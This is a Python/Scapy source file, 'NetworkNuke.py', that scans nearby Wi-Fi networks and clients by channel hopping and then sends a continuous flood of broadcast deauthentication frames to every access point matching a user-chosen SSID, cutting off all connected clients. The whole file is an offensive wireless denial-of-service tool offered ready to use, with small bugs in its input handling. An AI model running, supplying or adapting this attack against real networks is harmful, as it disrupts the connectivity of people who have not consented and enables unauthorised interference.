from scapy.all import *
import argparse
from multiprocessing import Process


# The dictionary of known networks, keyed by BSSID
known_networks = {}
# The list of networks that have been seen, but don't have info supplied
seen_networks = []
# The dictionary of known clients, with the networks they're connected to
known_clients = {}
# The process pointer of the channel hopper process
channel_hop_proc = None


# --- PACKET HANDLERS ---

def scan_network_handler(pckt):
    global channel_hop_proc
    handle_packet_response = handle_packet(pckt)
    if handle_packet_response != None:
        channel_hop_proc.terminate()
        channel_hop_proc = Process(target = smart_channel_hopper, args=(conf.iface, known_networks, handle_packet_response))
        channel_hop_proc.start()

def handle_packet(pckt):
    if not pckt.haslayer(Dot11):
        return

    # Handle network packet
    if pckt.haslayer(Dot11Beacon) or pckt.haslayer(Dot11ProbeResp):
        essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[Dot11Elt].info != '' else 'Hidden SSID'
        bssid = pckt[Dot11].addr3
        # Try to parse the channel, if it fails, then print and return.
        try:
            channel = int(ord(pckt[Dot11Elt:3].info))
        except:
            print pckt[Dot11Elt:3].info
            return

        if bssid not in known_networks:
            known_networks[bssid] = ( essid, channel )
            if bssid in seen_networks:
                seen_networks.remove(bssid)

            print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)
            return channel

        return

    type = pckt[Dot11].type
    subtype = pckt[Dot11].subtype

    # Handle client packet
    # If not a usable packet, then return
    if type == 2 and subtype == 4: 
        ap_bssid = pckt[Dot11].addr1
        cl_bssid = pckt[Dot11].addr2
        if ap_bssid not in seen_networks and ap_bssid not in known_networks and ap_bssid != "ff:ff:ff:ff:ff:ff":
            seen_networks.append(ap_bssid)
    elif (type == 2 and subtype == 8) or (type == 1 and subtype == 9):
        if pckt[Dot11].addr2 in seen_networks or pckt[Dot11].addr2 in known_networks:
            ap_bssid = pckt[Dot11].addr2
            cl_bssid = pckt[Dot11].addr1
        elif pckt[Dot11].addr1 in seen_networks or pckt[Dot11].addr2 in known_networks:
            ap_bssid = pckt[Dot11].addr1
            cl_bssid = pckt[Dot11].addr2
        else:
            return
    else:
        return

    if ap_bssid == "ff:ff:ff:ff:ff:ff":
        return

    if (cl_bssid in known_clients and known_clients[cl_bssid] == ap_bssid):
        return

    known_clients[cl_bssid] = ap_bssid
    print "{0:5}\t{1:5}\t{2:5}\t{3:5}".format( type, subtype, ap_bssid, cl_bssid)




# --- PRINT ---

def print_all():
    print '='*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel','ESSID','BSSID') + '='*100
    for bssid in sorted(known_networks, key=lambda x: known_networks[x][1]):
        essid = known_networks[bssid][0]
        channel = known_networks[bssid][1]
        print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)
    print '='*100 + '\n{0:5}\t{1:30}\t{2:5}\t{3:5}\n'.format('Channel','ESSID','BSSID', 'Client') + '='*100
    for cl_bssid in known_clients:
        ap_bssid = known_clients[cl_bssid]
        if ap_bssid in known_networks:
            ap_essid = known_networks[ap_bssid][0]
            ap_channel = known_networks[ap_bssid][1]
            print "{0:5}\t{1:30}\t{2:5}\t{3:5}".format( ap_channel, ap_essid, ap_bssid, cl_bssid )
        else:
            print "{0:35}\t{1:5}\t{2:5}".format( "", ap_bssid, cl_bssid )




# --- DEAUTH ---

def essid_deauth(essid):
    client = "FF:FF:FF:FF:FF:FF"
    pktlist = {1:[], 2:[], 3:[], 4:[], 5:[], 6:[], 7:[], 8:[], 9:[], 10:[], 11:[], 12:[], 13:[] }
    for bssid in sorted(known_networks, key=lambda x: known_networks[x][1]):
            # try:
            if known_networks[bssid][0] in essid:
                channel = known_networks[bssid][1]
                pkt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                pktlist[channel].append(pkt)
    while True:
        for channel in pktlist:
            if len(pktlist[channel]) > 0:
                os.system("iwconfig %s channel %d" % (conf.iface, channel))

                send(pktlist[channel], count=20, inter=0.005)



# --- CHANNEL HOPPERS ---

def smart_channel_hopper(iface, networks, channel):
    os.system("iwconfig %s channel %d" % (iface, channel))
    time.sleep(5)

    while True:
        for i in range(13):
            try:
                channel = (channel%13) + 1
                os.system("iwconfig %s channel %d" % (iface, channel))
                print channel
                time.sleep(1)
            except KeyboardInterrupt:
                break
        for bssid in sorted(networks, key=lambda x: networks[x][1], reverse=True):
            try:
                if not channel == networks[bssid][1]:
                    channel = networks[bssid][1]
                    os.system("iwconfig %s channel %d" % (iface, channel))
                    print channel
                time.sleep(2)
            except KeyboardInterrupt:
                break




# --- SCANNERS ---

def scan_networks():
    global channel_hop_proc
    print 'Press CTRL+c to stop sniffing..'
    channel_hop_proc = Process(target = smart_channel_hopper, args=(conf.iface, known_networks, 1))
    channel_hop_proc.start()
    sniff(prn=scan_network_handler, iface=conf.iface)
    # Terminate hopper after sniffing
    channel_hop_proc.terminate()
    print_all()

def main():
    parser = argparse.ArgumentParser(description='NetworkNuke.py')
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Interface to use for sniffing and packet injection, needs to be in monitor mode.')
    parser.add_argument('--channel', dest='channel', type=str, required=False, help='The channel of the AP.')
    args = parser.parse_args()
    
    conf.iface = args.interface

    scan_networks()

    while raw_input('Do you want to go to Deauth? Y to deauth, N to keep scanning: ') not in ['y', 'Y']:
        scan_networks()
        

    essid = raw_input('Enter an SSID to perform a deauth attack (q to quit): ')
    essid = essid.split(";")
    while not any(e[0] in essid for e in known_networks.values()):
        if 'q' in essid : sys.exit(0)
        raw_input('SSID not detected... Please enter another (q to quit): ')

    print "Nuking " + str(essid)
    essid_deauth(essid)


if __name__ == '__main__':
    main()
